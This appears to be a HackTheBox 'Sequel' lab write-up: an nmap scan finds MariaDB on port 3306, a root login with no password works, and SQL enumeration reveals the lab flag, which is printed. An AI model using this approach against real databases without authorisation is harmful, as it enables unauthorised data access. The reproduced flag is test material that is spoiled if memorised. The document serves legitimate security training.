+++
title = "Sequel"
description = "Starting Point machine focused on service enumeration and access to a MariaDB database."

platform = "HackTheBox"
OS = "Linux"
difficulty = "Very-Easy"

tags = [
"MariaDB",
"SQL",
"Starting Point",
"Fundamental Exploitation"
]

image = "/images/writeups/Sequel/sequel.png"
+++

### Overview

**Sequel** is a machine from the **Starting Point** path on Hack The Box. It is designed to practice fundamental concepts of service enumeration and access to a **MariaDB** database.

The objective is to identify the exposed database service, establish a connection, and perform basic enumeration until locating the flag stored in the database.

---

### Enumeration

We begin by verifying connectivity to the target machine using **Ping**:

```bash
ping <TARGET_IP>
```

The machine responds successfully, so we continue with service enumeration using **Nmap**:

```bash
sudo nmap -sC -sV -p 3306 -sS --min-rate 5000 -Pn -T4 <TARGET_IP>
```

The scan shows the following result:

```text
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Status: Autocommit
|   Auth Plugin Name: mysql_native_password
```

Port `3306/tcp` is open and corresponds to the **MySQL/MariaDB** service.

Nmap specifically identifies the following version:

```text
10.3.27-MariaDB-0+deb10u1
```

With the service identified, we attempt to establish a connection using the **MariaDB** client:

```bash
sudo mysql -h <TARGET_IP> -u root --skip-ssl
```

The connection is successful, giving us access to the MariaDB monitor:

```text
Welcome to the MariaDB monitor.
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
```

---

### Initial Access

Once inside MariaDB, we begin by enumerating the available databases:

```sql
SHOW DATABASES;
```

`SHOW DATABASES;` allows us to list the databases available on the server.

The server returns:

```text
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

The `htb` database is relevant, so we proceed to select it:

```sql
USE htb;
```

`USE` allows us to select the database on which the following queries will be executed.

Next, we enumerate the available tables:

```sql
SHOW TABLES;
```

`SHOW TABLES;` displays the tables available within the selected database.

We obtain:

```text
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

We find the `config` and `users` tables. We continue by examining the structure of `config`:

```sql
DESCRIBE config;
```

`DESCRIBE` allows us to examine the structure of a table, showing its columns and data types.

The result shows the following fields:

```text
+-------+---------------------+
| Field | Type                |
+-------+---------------------+
| id    | bigint(20) unsigned |
| name  | text                |
| value | text                |
+-------+---------------------+
```

To query the records stored in the table, we use:

```sql
SELECT * FROM config;
```

`SELECT` allows us to retrieve data from a table. The `*` character indicates that we want to retrieve all columns.

Among the results, we find a record related to the flag:

```text
| 5 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 |
```

Finally, we use a `WHERE` condition to specifically query the record whose `id` is `5`:

```sql
SELECT * FROM config WHERE id = 5;
```

`WHERE` allows us to filter results according to a specific condition.

The result confirms the presence of the flag:

```text
+----+------+----------------------------------+
| id | name | value                            |
+----+------+----------------------------------+
|  5 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 |
+----+------+----------------------------------+
```

![sql.en.png](/images/writeups/Sequel/sql.en.png)

---

### Flag

The flag found in the `config` table is:

```text
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

### Conclusion

**Sequel** presents a straightforward scenario based on the enumeration of a **MariaDB** service and direct interaction with a database.

The process followed was:

```text
Enumeration
    ↓
Port 3306 Identification
    ↓
MariaDB Detection
    ↓
Connection using the MariaDB client
    ↓
Database Enumeration
    ↓
Selection of the htb Database
    ↓
Table Enumeration
    ↓
Identification of the config Table
    ↓
Record Enumeration
    ↓
Flag Retrieval
```

Despite its **Very Easy** difficulty, the machine allows us to practice fundamental concepts related to database service enumeration, the use of the MariaDB client, and basic SQL queries to navigate through a database and locate specific information.

---

### [Status: Completed](https://labs.hackthebox.com/achievement/machine/3933963/403)
